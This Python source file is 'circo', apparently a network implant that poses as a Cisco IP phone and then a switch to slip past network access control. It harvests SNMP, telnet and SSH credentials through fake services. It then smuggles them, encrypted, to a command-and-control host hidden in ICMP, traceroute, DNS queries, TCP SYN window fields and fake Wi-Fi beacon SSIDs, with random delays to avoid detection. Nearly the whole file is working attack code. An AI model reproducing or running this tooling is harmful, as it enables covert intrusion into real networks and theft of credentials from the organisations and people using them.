#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
import subprocess
import os
import signal
import re
import argparse
import sys
import time
import random
import threading
import unicodedata
import daemon
import ipcalc
import pyaes
import pyscrypt
# Remove Scapy IPv6 Warning
sys.stderr = None
# need Scapy >2.3.3 (CDP Checksum fix)
from scapy.all import *
# Revert back the STD output
sys.stderr = sys.__stderr__

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "1.2"

# Default options OFF
DEBUG = False
EAP = False
EPING = False
ETRACE = False
EDNS = False
EWEB = False
ESSL = False

# Config
phrase = 'Waaaaa! awesome :)'
salt = 'salgruesa'
phonemac = '10:8C:CF:75:85:AA'
phonename = 'SEP' + phonemac.replace(':', '')
phoneport = 'Port 1'
switchmac = '00:8E:73:83:12:BB'
switchport = 'GigabitEthernet1/0/3'
serial = 'FCW1831C15Q'
snpsu = 'LIT18300QVU'
cchost = '172.16.1.100'
ccname = 'evil.sub.domain'
dirname = '/home/pi/circo/circo_v1/'

# Perm files
motd = dirname + 'circo-logo'
phonecdptpl = dirname + 'phonecdp-tpl.pcap'
swcdptpl = dirname + 'swcdp-tpl.pcap'
aptpl = dirname + 'ap-tpl.pcap'
snmptpl = dirname + 'Cisco_3850-tpl.snmpwalk'

# Temp files
snmpfake = dirname + 'Cisco_3850-fake.snmpwalk'
cdpdata = dirname + 'cdp-data.txt'
dhcpfd = dirname + 'dhcp-details.txt'
clifd = dirname + 'cli.conf'
agent = dirname + 'agent.csv'
mastercred = dirname + time.strftime(
             "%Y%m%d%H%M%S_CRED.txt", time.gmtime())


# Classes

class ARPHandler(threading.Thread):
    """
    Class to observe ARP response packets
    and save Gateway MAC address into a file
    """
    def __init__(self, iface, ip, fd):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.ip = ip
        self.fd = open(fd, 'a')

    def pkt_callback(self, pkt):
        if pkt.haslayer(ARP):
                if (pkt[ARP].op == 2) and (pkt[ARP].psrc == self.ip):
                    self.fd.write(pkt.src + '\n')
                    self.fd.close()

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback, filter="arp",
                  store=0, timeout=2)

    def join(self):
        self.stoprequest.set()


class APHandler(threading.Thread):
    """
    Class to handle the Fake AP broadcasting SSID for extraction
    probe interval is 0.5 seconds per BSSID, adjust timer and inter if need it
    """
    def __init__(self, wiface, fd, timer):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.wiface = wiface
        self.fd = fd
        self.count = timer*2

    def run(self):
        while not self.stoprequest.isSet():
            if os.path.isfile(self.fd):
                # Load template beacon packet
                wifipkt = rdpcap(aptpl, 1)[0]
                # fake-ssid (need to match jaula_v1.py)
                SSIDroot = 'aterm-c17c02'
                # fake BSSID from NEC aterm routers
                add2 = '98:f1:99:c1:7c:02'
                wifipkt[Dot11].addr2 = add2
                wifipkt[Dot11].addr3 = add2
                with open(self.fd, 'r') as sfile:
                    for line in sfile:
                        if DEBUG:
                            print('Sending credentials via Fake-AP')
                        cry = encrypti(line.strip())
                        # split crypto len by 6
                        ar = [cry[i:i+6] for i in range(0, len(cry), 6)]
                        # padding
                        if len(ar) % 6 != 0:
                            for x in range(6-len(ar[len(ar)-1])):
                                ar[len(ar)-1] = ar[len(ar)-1] + '0'
                        # send first SSID (with out -g)
                        wifipkt[Dot11].SC = len(ar)
                        wifipkt[Dot11Beacon].beacon_interval = len(cry)
                        wifipkt[Dot11Elt].info = SSIDroot
                        wifipkt[Dot11Elt].len = len(SSIDroot)
                        # send the rest of SSID (with -g)
                        sendp(wifipkt, iface=self.wiface, inter=0.500,
                              count=self.count, verbose=0)
                        for x in range(len(ar)):
                            nadd2 = ('98:f1:99:' + ar[x][0:2] + ':' +
                                     ar[x][2:4] + ':' + ar[x][4:6])
                            wifipkt[Dot11].SC = x
                            wifipkt[Dot11].addr2 = nadd2
                            wifipkt[Dot11].addr3 = nadd2
                            wifipkt[Dot11Elt].info = 'aterm-' + ar[x] + '-g'
                            wifipkt[Dot11Elt].len = len(wifipkt[Dot11Elt].info)
                            sendp(wifipkt, iface=self.wiface, inter=0.500,
                                  count=self.count, verbose=0)
                        time.sleep(30)

    def join(self):
        self.stoprequest.set()


class CDPHandler(threading.Thread):
    """
    Class to handle CDP packets, will start in background and send
    packets every 60 seconds, pretend to be a Cisco Phone or Switch
    """
    def __init__(self, iface, pkt, mac, ip, name, port):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.cdppkt = pkt[0]
        self.mac = mac
        self.ip = ip
        self.name = name
        self.port = port

    def run(self):
        # Build Fake CDP packet using template (phone or switch)
        fakepkt = self.cdppkt
        ip = self.ip
        del fakepkt.cksum
        del fakepkt.len
        fakepkt[Dot3].src = self.mac
        fakepkt[CDPv2_HDR][CDPMsgAddr][CDPAddrRecordIPv4].addr = ip
        # Mgmt IP field used for switches (not phone)
        if 'Phone' not in fakepkt[CDPv2_HDR][CDPMsgPlatform].val:
            fakepkt[CDPv2_HDR][CDPMsgMgmtAddr][CDPAddrRecordIPv4].addr = ip
        fakepkt[CDPv2_HDR][CDPMsgDeviceID].val = self.name
        fakepkt[CDPv2_HDR][CDPMsgDeviceID].len = len(
                                            fakepkt[CDPv2_HDR][CDPMsgDeviceID])
        fakepkt[CDPv2_HDR][CDPMsgPortID].iface = self.port
        fakepkt[CDPv2_HDR][CDPMsgPortID].len = len(
                                            fakepkt[CDPv2_HDR][CDPMsgPortID])
        fakepkt.len = len(fakepkt[CDPv2_HDR]) + 8
        # re-calculate cksum
        fakepkt = fakepkt.__class__(str(fakepkt))

        while not self.stoprequest.isSet():
            sendp(fakepkt, verbose=0, iface=self.iface)
            time.sleep(60)

    def join(self):
        self.stoprequest.set()


class SNMPHandler(threading.Thread):
    """
    Sniff for packets on UDP/161 and extract community into a file
    default community 'public' is not added as credentials
    """
    def __init__(self, iface, fd):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.fd = fd
        self.community = 'public'

    def nonascii(self, s):
        return "".join(ch for ch in s if unicodedata.category(ch)[0] != "C")

    def pkt_callback(self, pkt):
        if pkt.haslayer(SNMP) and pkt[SNMP].community:
            comm = str(self.nonascii(str(pkt[SNMP].community).decode('utf_8')))
            if (comm != self.community) and not grep(self.fd, comm):
                with open(self.fd, 'a+') as sfile:
                    sfile.write('p,' + comm + '\n')
                    if DEBUG:
                        print('Found SNMP credentials')

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback,
                  filter="udp port 161", store=0, count=1)

    def join(self):
        self.stoprequest.set()


class DHCPHandler(threading.Thread):
    """
    Class for DHCP responses, parse it and store in temp file
    """
    def __init__(self, fd, iface, hostname):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.fd = open(fd, 'w')
        self.iface = iface
        self.hostname = hostname
        self.offer = 1

    def pkt_callbak(self, pkt):
        if DHCP in pkt:
            mtype = pkt[DHCP].options[0][1]
            ipaddr = pkt[BOOTP].yiaddr
            sip = pkt[BOOTP].siaddr
            mac = get_if_hwaddr(self.iface)
            if (mtype == 2) and (self.offer <= 1):
                self.offer = self.offer + 1
                for opt in pkt[DHCP].options:
                    if 'router' in opt:
                        gwip = opt[1]
                    if 'subnet_mask' in opt:
                        netmask = opt[1]
                    if (('name_server' in opt) or
                       ('domain-name-servers' in opt)):
                        dns = opt[1]
                self.fd.write(ipaddr + ',' + netmask + ','
                              + gwip + ',' + dns + ',')
                request = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                           IP(src="0.0.0.0", dst="255.255.255.255") /
                           UDP(sport=68, dport=67) /
                           BOOTP(chaddr=pkt[BOOTP].chaddr,
                                 xid=pkt[BOOTP].xid) /
                           DHCP(options=[('message-type', 'request'),
                                         ('server_id', sip),
                                         ('requested_addr', ipaddr),
                                         ('hostname', self.hostname),
                                         ('param_req_list', 0),
                                         ('end')
                                         ])
                           )
                sendp(request, iface=self.iface, verbose=0)

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callbak,
                  filter="udp and (port 68 or port 67)", store=0)

    def join(self):
        self.stoprequest.set()
        self.fd.close()


# Functions
def grep(fd, pattern):
    if os.path.isfile(fd):
        with open(fd, "r") as sfile:
            lines = sfile.read().split()
            for x in range(len(lines)):
                if pattern in lines[x]:
                    return True
        return False
    else:
        return False


# If can't find CDP with hostname, setup 'switch01'
def discover(opciones):
    fd = open(cdpdata, 'w')
    cli = open(clifd, 'w')
    cdpname = sniff(iface=opciones.nic,
                    filter='ether[20:2] == 0x2000', count=1, timeout=60)
    if cdpname:
        fd.write('cdp,' + cdpname[0][CDPv2_HDR][CDPMsgDeviceID].val + '\n')
        cli.write('<CDPNAME>,'
                  + cdpname[0][CDPv2_HDR][CDPMsgDeviceID].val + '\n')
        cli.write('<CDPINT>,'
                  + cdpname[0][CDPv2_HDR][CDPMsgPortID].iface + '\n')
        cli.write('<CDPMODEL>,'
                  + str(cdpname[0][CDPv2_HDR][CDPMsgPlatform].val).split()[1]
                  + '\n')
    else:
        fd.write('cdp,switch01\n')
        cli.write('<CDPNAME>,sw01\n')
        cli.write('<CDPINT>,GigaEtherneti1/0/2\n')
        cli.write('<CDPMODEL>,WS-C3850-48P\n')
    fd.close()
    cli.close()


def changemac(iface, newmac):
    subprocess.call('macchanger --mac=' + newmac + ' '
                    + iface + ' >/dev/null', shell=True)


# Replace add route, resolve and setup IP (from DHCP)
def setip(iface, ip, mask, gw, dns):
    FNULL = open(os.devnull, 'w')
    RESOLVE = open('/etc/resolv.conf', 'w')
    subprocess.call(["ifconfig", iface, ip, "netmask", mask],
                    stdout=FNULL, stderr=subprocess.STDOUT)
    subprocess.call(["route", "add", "default", "gw", gw],
                    stdout=FNULL, stderr=subprocess.STDOUT)
    subprocess.call(["echo", "nameserver", dns],
                    stdout=RESOLVE, stderr=FNULL)
    RESOLVE.close()


# Generate fake switch name
def newname(cname):
    laststr = cname[-1:]
    if laststr.isdigit():
        total = int(laststr) + 2
        newswname = cname[:len(cname)-1] + str(total)
    else:
        newswname = cname + '01'
    return newswname


def kill_process(pstring):
    for line in os.popen("ps ax | grep " + pstring + " | grep -v grep"):
        fields = line.split()
        pid = fields[0]
        os.kill(int(pid), signal.SIGKILL)


# Build SNMP OID Fake config
def snmpconf(swname, swip, swmask, swnet, gw, gwmac):
    gwmachex = gwmac.split(':')[0].upper() + ' '\
                + gwmac.split(':')[1].upper() + ' '\
                + gwmac.split(':')[2].upper() + ' '\
                + gwmac.split(':')[3].upper() + ' '\
                + gwmac.split(':')[4].upper() + ' '\
                + gwmac.split(':')[5].upper()
    hexip = "%0.2X" % int(swip.split('.')[0])\
            + " %0.2X" % int(swip.split('.')[1])\
            + " %0.2X" % int(swip.split('.')[2])\
            + " %0.2X" % int(swip.split('.')[3])\
            + ' 00 A1'
    with open(snmptpl, 'r') as sfile:
        content = sfile.read()
        for repl in (('<NAME>', swname),
                     ('<IP>', swip),
                     ('<MASK>', swmask),
                     ('<NET>', swnet),
                     ('<GATEWAY>', gw),
                     ('<GWMAC>', gwmachex),
                     ('<IPHEX>', hexip)):
            content = content.replace(*repl)
    with open(snmpfake, 'w') as sfile:
        sfile.write(content)
    with open(agent, 'w') as sfile:
        sfile.write(snmpfake + ',' + swip + ',public\n')


# AES crypto
def encrypti(cleartxt):
    hashed = pyscrypt.hash(phrase, salt, 1024, 1, 1, 16)
    key = hashed.encode('hex')
    aes = pyaes.AESModeOfOperationCTR(key)
    ciphertxt = aes.encrypt(cleartxt)
    return ciphertxt.encode('hex')


def parsingopt():
    parser = argparse.ArgumentParser()
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable debugging')
    parser.add_argument('-i', dest='nic', required=True, metavar='<eth0>',
                        default='eth0', help='Interface: eth0')
    parser.add_argument('-p', '--ping', action='store_true',
                        help='PING exfiltration')
    parser.add_argument('-t', '--trace', action='store_true',
                        help='Traceroute exfiltration')
    parser.add_argument('-d', '--dns', action='store_true',
                        help='DNS exfiltration')
    parser.add_argument('-w', '--web', action='store_true',
                        help='HTTP exfiltration')
    parser.add_argument('-s', '--ssl', action='store_true',
                        help='HTTPS exfiltration')
    parser.add_argument('-a', dest='wnic', metavar='<wlan1>',
                        help='Wireles exfiltration')
    if len(sys.argv) > 1:
        try:
            return parser.parse_args()
        except IOError, msg:
            parser.error(str(msg))
    else:
        with open(motd, 'r') as sfile:
            print(sfile.read())
        print('Author: ' + __author__)
        print('Version: ' + __version__ + '\n')
        parser.print_help()
        sys.exit(1)


# Main Function

def main():
    global DEBUG
    global EAP
    global EPING
    global ETRACE
    global EDNS
    global EWEB
    global ESSL
    opciones = parsingopt()
    if opciones.verbose:
        DEBUG = True
    if opciones.nic:
        iface = opciones.nic
    if opciones.wnic:
        wiface = opciones.wnic
        EAP = True
    if opciones.ping:
        EPING = True
    if opciones.trace:
        ETRACE = True
    if opciones.dns:
        EDNS = True
    if opciones.web:
        EWEB = True
    if opciones.ssl:
        ESSL = True

    # Load Scapy modules
    load_contrib("cdp")

    # Bring LAN interface up
    subprocess.call('/sbin/ifconfig ' + iface + ' up', shell=True)

    # Change MAC, became a Cisco IP-Phone!
    if DEBUG:
        print('MAC change started - phone')
    changemac(iface, phonemac)
    if DEBUG:
        print('MAC change ended - phone')

    # Listen for CDP packets to get hostname from it
    if DEBUG:
        print('CDP discover started')
    discover(opciones)
    if DEBUG:
        print('CDP discover ended')

    # Grab an IP using DHCP
    if DEBUG:
        print('DHCP started')
    dh = DHCPHandler(dhcpfd, iface, phonename)
    dh.daemon = True
    dh.start()
    time.sleep(0.5)
    mac = get_if_hwaddr(iface)
    chaddr = ''.join([chr(int(x, 16)) for x in mac.split(':')])
    dhcpdiscover = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                    IP(src="0.0.0.0", dst="255.255.255.255") /
                    UDP(sport=68, dport=67) /
                    BOOTP(chaddr=chaddr, xid=random.randint(0, 0xFFFF)) /
                    DHCP(options=[('message-type', 'discover'), 'end'])
                    )
    sendp(dhcpdiscover, iface=iface, verbose=0)
    time.sleep(10)
    dh.join()
    # need to add module for static ip in case DHCP doesn't work
    with open(dhcpfd, 'r') as sfile:
        for line in sfile:
            ip = line.split(',')[0]
            netmask = line.split(',')[1]
            gwip = line.split(',')[2]
            dns = line.split(',')[3]
    if DEBUG:
        print('DHCP ended')

    # Configure interface
    if DEBUG:
        print('Interface config started')
    setip(iface, ip, netmask, gwip, dns)
    if DEBUG:
        print('Interface config ended')

    # Start ARP daemon to capture responses
    arpdh = ARPHandler(iface, gwip, dhcpfd)
    arpdh.daemon = True
    arpdh.start()
    if DEBUG:
        print('ARP gw started')

    # Send ARP WHO-HAS to grab MAC from default gateway
    arppkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, psrc=ip, pdst=gwip)
    sendp(arppkt, iface=iface, verbose=0)
    time.sleep(2)
    arpdh.join()
    with open(dhcpfd, 'r') as sfile:
        for line in sfile:
            gwmac = line.split(',')[4].strip()
    if DEBUG:
        print('ARP gw ended')

    # Pretend to be a phone to bypass NAC, tune the amount of time you want
    cdppkt = rdpcap(phonecdptpl, 1)
    cdpdh = CDPHandler(iface, cdppkt, phonemac, ip, phonename, phoneport)
    cdpdh.daemon = True
    cdpdh.start()
    if DEBUG:
        print('CDPd started - phone')
    # Stop calling .join() after X seconds (default 60sec)
    if DEBUG:
        time.sleep(10)
        print('CDPd stoped (60sec) - phone (verbose 10sec)')
    else:
        time.sleep(60)
    cdpdh.join()

    # Wait 300sec or more to clear MAC (180sec to clear CDP)
    if DEBUG:
        print('Wait 300sec for MAC & CDP cache to clear (verbose 10sec)')
    if not DEBUG:
        time.sleep(300)
    else:
        time.sleep(10)

    # Change MAC to became a Cisco Switch
    if DEBUG:
        print('MAC change started - switch')
    changemac(iface, switchmac)
    if DEBUG:
        print('MAC change ended - switch')

    # Search CDP packets from discover()
    find = re.compile('cdp,(.*)')
    with open(cdpdata, 'r') as sfile:
        swname = find.findall(sfile.read())
    if swname:
        fakeswname = newname(swname[0])
    else:
        # make up a name if can't derive
        fakeswname = 'sw-test01'
    if DEBUG:
        print('Hostname setup - switch')

    # Start fake CDP as 'switch'
    cdppkt = rdpcap(swcdptpl, 1)
    cdpdh = CDPHandler(iface, cdppkt, switchmac, ip, fakeswname, switchport)
    cdpdh.daemon = True
    cdpdh.start()
    if DEBUG:
        print('CDPd started - switch')

    # Create SNMP config for snmposter daemon
    ipnet = str(ipcalc.Network(ip + '/' + netmask).network())
    snmpconf(fakeswname, ip, netmask, ipnet, gwip, gwmac)
    if DEBUG:
        print('SNMP config created')

    # Start snmposter daemon
    kill_process('snmposter')
    subprocess.call("/usr/local/bin/snmposter -f " + agent
                    + " 2>/dev/null", shell=True)
    snmpdh = SNMPHandler(iface, mastercred)
    snmpdh.daemon = True
    snmpdh.start()
    if DEBUG:
        print('SNMP catcher started')

    # Create config file for telnet & ssh fake daemons
    with open(clifd, 'a') as cli:
        cli.write('<NAME>,' + fakeswname + '\n')
        cli.write('<IP>,' + ip + '\n')
        cli.write('<MASK>,' + netmask + '\n')
        cli.write('<MASKCIDR>,' + str(sum([bin(int(x)).count("1")
                                      for x in netmask.split(".")])) + '\n')
        swcmac = switchmac.replace(':', '')
        swmaccisco = swcmac[0:4].lower() + '.' + swcmac[4:8].lower()\
            + '.' + swcmac[8:12].lower()
        cli.write('<MAC>,' + swmaccisco + '\n')
        cli.write('<NETIP>,' + ipnet + '\n')
        cli.write('<GWIP>,' + gwip + '\n')
        macraw = gwmac.replace(':', '')
        gwmaccisco = macraw[0:4] + '.' + macraw[4:8] + '.' + macraw[8:12]
        cli.write('<GWMAC>,' + gwmaccisco + '\n')
        cli.write('<SERIAL>,' + serial + '\n')
        cli.write('<SNPSU>,' + snpsu + '\n')
        # Future use in Circo v2
        cli.write('<SNMPC>,public\n')
    if DEBUG:
        print('CLI config created')

    # Kill telnet/ssh process if running and start them
    kill_process('telnetd-fake')
    if DEBUG:
        print('TELNET catcher started')
    telned = dirname + 'telnetd-fake.py'
    subprocess.call(telned + ' ' + mastercred + ' &', shell=True)
    if DEBUG:
        print('SSH catcher started')
    kill_process('sshd-fake')
    sshd = dirname + 'sshd-fake.py'
    subprocess.call(sshd + ' ' + mastercred + ' &', shell=True)

    # If Fake-AP exfiltration enable put wireless interface into monitor
    # Channel 10 (adjust as necessary to match jaula_v1.py)
    if EAP:
        if DEBUG:
            print('WIFI monitor started')
        subprocess.call('/sbin/ifconfig ' + wiface + ' down', shell=True)
        subprocess.call('/usr/sbin/airmon-ng start '
                        + wiface + ' 10 >/dev/null', shell=True)
        wiface = wiface + 'mon'
        subprocess.call('/sbin/ifconfig ' + wiface + ' up', shell=True)

        # Start Fake AP
        aphd = APHandler(wiface, mastercred, 4)
        aphd.daemon = True
        aphd.start()
        if DEBUG:
            print('AP started')

    # Main Loop if credentials found
    while True:
        try:
            if os.path.isfile(mastercred):
                with open(mastercred, 'r') as sfile:
                    for line in sfile:
                        # encrypt and split into 4 bytes
                        cry = encrypti(line.strip())
                        ar = [cry[i:i+4] for i in range(0, len(cry), 4)]
                        if len(cry) % 4 != 0:
                            for x in range(4-len(ar[len(ar)-1])):
                                ar[len(ar)-1] = ar[len(ar)-1] + '0'

                        # ICMP exfiltration
                        # Use [IP].id 200+len of crypto (first pkt)
                        # Then [IP].id 300+amount of pkts (split by 16bits)
                        # Send the crypto split by 16bits and replace
                        # [ICMP].seq field
                        if EPING:
                            if DEBUG:
                                print('Sending credentials via ICMP')
                            # craft packet
                            pingpkt = (Ether(src=switchmac, dst=gwmac) /
                                       IP(ihl=5, src=ip, dst=cchost)/ICMP() /
                                       Raw(load='s\x88\xb7[\x7f\xc2\x05\x00'
                                                '\x08\t\n\x0b\x0c\r\x0e\x0f'
                                                '\x10\x11\x12\x13\x14\x15\x16'
                                                '\x17\x18\x19\x1a\x1b\x1c\x1d'
                                                '\x1e\x1f !"#$%&\'()*+,-./012'
                                                '34567'))

                            # first pkt (crypto len)
                            pingpkt[IP].id = 200 + len(cry)
                            pingpkt[ICMP].seq = 1
                            pingpkt[ICMP].id = random.randint(0, 0xFFFF)
                            pingpkt = pingpkt.__class__(str(pingpkt))
                            sendp(pingpkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))

                            # second pkt (amount of pkts)
                            del pingpkt[IP].chksum
                            del pingpkt[ICMP].chksum
                            pingpkt[IP].id = 300 + len(ar)
                            pingpkt[ICMP].seq = 2
                            pingpkt[ICMP].id = pingpkt[ICMP].id + 1
                            pingpkt = pingpkt.__class__(str(pingpkt))
                            sendp(pingpkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))

                            # paylod pkts
                            for x in range(len(ar)):
                                del pingpkt[IP].chksum
                                del pingpkt[ICMP].chksum
                                pingpkt[IP].id = 500 + x
                                pingpkt[ICMP].seq = int(ar[x], 16)
                                pingpkt[ICMP].id = pingpkt[ICMP].id + 1
                                pingpkt = pingpkt.__class__(str(pingpkt))
                                sendp(pingpkt, iface=iface, verbose=0)
                                # random delay
                                if not DEBUG:
                                    time.sleep(random.randint(1, 30))

                        # Traceroute exfiltration
                        # Use [IP].id 200+len and [IP].id 300+amount of pkts
                        # To encapsulate crypto, split by 16bits and attach
                        # last 4 bytes of traceroute[UDP] Raw (@ABC.....)
                        if ETRACE:
                            if DEBUG:
                                print('Sending credentials via Traceroute')
                            # craft packet
                            trcpkt = (Ether(src=switchmac, dst=gwmac) /
                                      IP(ihl=5, src=ip, dst=cchost) /
                                      UDP(sport=53200, dport=33434) /
                                      Raw(load='@ABCDEFGHIJKLMNOP'
                                               'QRSTUVWXYZ[abcd'))

                            # first pkt (crypto len)
                            trcpkt[IP].ttl = 32
                            trcpkt[IP].id = 200 + len(cry)
                            trcpkt = trcpkt.__class__(str(trcpkt))
                            sendp(trcpkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))

                            # second pkt (amount of pkts)
                            trcpkt[IP].id = 300 + len(ar)
                            del trcpkt[IP].chksum
                            del trcpkt[UDP].chksum
                            trcpkt = trcpkt.__class__(str(trcpkt))
                            sendp(trcpkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))

                            # payload pkts
                            for x in range(len(ar)):
                                del trcpkt[IP].chksum
                                del trcpkt[UDP].chksum
                                trcpkt[IP].id = 500 + x
                                trcpkt[IP].ttl = 32 - x
                                trcpkt[UDP].dport = trcpkt[UDP].dport + x // 3
                                trcpkt[Raw].load = '@ABCDEFGHIJKLMNO'\
                                                   'PQRSTUVWXYZ[' + ar[x]
                                trcpkt = trcpkt.__class__(str(trcpkt))
                                sendp(trcpkt, iface=iface, verbose=0)
                                # random delay
                                if not DEBUG:
                                    time.sleep(random.randint(1, 30))

                        # DNS exfiltration
                        # Within a DNS NS pkt, we set the crypto (all of it)
                        # as subdomain <crypto>.ccname
                        if EDNS:
                            if DEBUG:
                                print('Sending credentials via DNS')
                            # craft packet
                            dnspkt = (Ether(src=switchmac, dst=gwmac) /
                                      IP(ihl=5, src=ip, dst=dns) /
                                      UDP(sport=53, dport=53) /
                                      DNS(rd=1,
                                          qd=DNSQR(
                                                   qname=cry+'.'+ccname,
                                                   qtype='NS')))

                            # one pkt (crypto)
                            dnspkt[IP].id = random.randint(0, 0xFFFF)
                            dnspkt[DNS].id = random.randint(0, 0xFFFF)
                            dnspkt = dnspkt.__class__(str(dnspkt))
                            sendp(dnspkt, iface=iface, verbose=0)

                        # HTTP exfiltration
                        # We don't neeed a fully TCP/3WAY, just a few SYN
                        # packets. As before, [IP].id used for crypto len &
                        # amount of pkt. The crypto payload split / 4
                        # (16bits each) hidden on [TCP].window field
                        if EWEB:
                            if DEBUG:
                                print('Sending credentials via HTTP')
                            # craft packet
                            httppkt = (Ether(src=switchmac, dst=gwmac) /
                                       IP(ihl=5,
                                          flags='DF',
                                          src=ip,
                                          dst=cchost) /
                                       TCP(sport=random.randint(3025, 38000),
                                           dport=80,
                                           ack=0,
                                           dataofs=10,
                                           reserved=0,
                                           flags='S',
                                           urgptr=0))
                            httppkt[TCP].options = [('MSS', 1460),
                                                    ('SAckOK', ''),
                                                    ('Timestamp',
                                                     (int(time.time()), 0)),
                                                    ('NOP', None),
                                                    ('WScale', 6)]
                            httppkt[TCP].seq = random.randint(1000000000,
                                                              1800000000)
                            httppkt[TCP].window = random.randint(30000, 40000)

                            # first pkt (crypto len)
                            httppkt[IP].id = 200 + len(cry)
                            httppkt = httppkt.__class__(str(httppkt))
                            sendp(httppkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))

                            # second pkt (amount of pkts)
                            del httppkt[IP].chksum
                            del httppkt[TCP].chksum
                            httppkt[IP].id = 300 + len(ar)
                            httppkt = httppkt.__class__(str(httppkt))
                            sendp(httppkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))

                            # payload pkts
                            for x in range(len(ar)):
                                del httppkt[IP].chksum
                                del httppkt[TCP].chksum
                                httppkt[IP].id = 500 + x
                                httppkt[TCP].window = int(ar[x], 16)
                                httppkt = httppkt.__class__(str(httppkt))
                                sendp(httppkt, iface=iface, verbose=0)
                                # random delay
                                if not DEBUG:
                                    time.sleep(random.randint(1, 30))

                        # HTTPS/SSL exfiltration
                        # We don't neeed a fully TCP/3WAY, just a few SYN
                        # packets. As before, [IP].id used for crypto len &
                        # amount of pkt. The crypto payload split / 4
                        # (16bits each) hidden on [TCP].window field
                        if ESSL:
                            if DEBUG:
                                print('Sending credentials via HTTPS')
                            # craft packet
                            httpspkt = (Ether(src=switchmac, dst=gwmac) /
                                        IP(ihl=5,
                                           flags='DF',
                                           src=ip,
                                           dst=cchost) /
                                        TCP(sport=random.randint(3025, 38000),
                                            dport=443,
                                            ack=0,
                                            dataofs=10,
                                            reserved=0,
                                            flags='S',
                                            urgptr=0))
                            httpspkt[TCP].options = [('MSS', 1460),
                                                     ('SAckOK', ''),
                                                     ('Timestamp',
                                                      (int(time.time()), 0)),
                                                     ('NOP', None),
                                                     ('WScale', 6)]
                            httpspkt[TCP].seq = random.randint(1000000000,
                                                               1800000000)
                            httpspkt[TCP].window = random.randint(30000, 40000)

                            # first pkt (crypto len)
                            httpspkt[IP].id = 200 + len(cry)
                            httpspkt = httpspkt.__class__(str(httpspkt))
                            sendp(httpspkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))

                            # second pkt (amount of pkts)
                            del httpspkt[IP].chksum
                            del httpspkt[TCP].chksum
                            httpspkt[IP].id = 300 + len(ar)
                            httpspkt = httpspkt.__class__(str(httpspkt))
                            sendp(httpspkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))

                            # payload pkts
                            for x in range(len(ar)):
                                del httpspkt[IP].chksum
                                del httpspkt[TCP].chksum
                                httpspkt[IP].id = 500 + x
                                httpspkt[TCP].window = int(ar[x], 16)
                                httpspkt = httpspkt.__class__(str(httpspkt))
                                sendp(httpspkt, iface=iface, verbose=0)
                                # random delay
                                if not DEBUG:
                                    time.sleep(random.randint(1, 30))

                # Define interval between exfiltration (per line of cred file)
                if DEBUG:
                    print('Credentials by line 300sec interval (10s verbose)')
                    time.sleep(10)
                else:
                    time.sleep(300)

        # Capture ctrl+c for clean exit
        except KeyboardInterrupt:
            kill_process('sshd-fake')
            kill_process('telnetd-fake')
            kill_process('snmposter')
            cdpdh.join()
            try:
                aphd.join()
            except NameError:
                pass
            sys.exit(0)


# Call main
if __name__ == '__main__':
    main()
